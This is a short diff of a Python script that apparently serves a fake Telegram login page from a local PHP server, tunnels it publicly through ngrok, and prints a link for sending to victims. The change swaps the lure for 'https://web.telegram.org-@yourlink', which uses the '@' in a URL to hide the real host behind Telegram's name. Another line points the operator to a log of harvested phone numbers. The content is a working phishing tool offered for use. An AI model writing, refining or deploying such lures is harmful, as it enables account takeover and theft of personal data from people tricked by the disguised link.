@@ -11,6 +11,6 @@ with open("server","w") as phplog:
     Popen(("php","-S","localhost:4040","-t","telegram"),stderr=phplog ,stdout=phplog)
 link=ngrok.connect(4040,"http")
 print(link)
-print(Fore.GREEN+" youcan send link :https://www.instafollowerspro.com@-yourlink")
+print(Fore.GREEN+" youcan send link: https://web.telegram.org-@yourlink")
 print(Fore.GREEN+"phone number cd telegram/cat log.txt")
 input("")
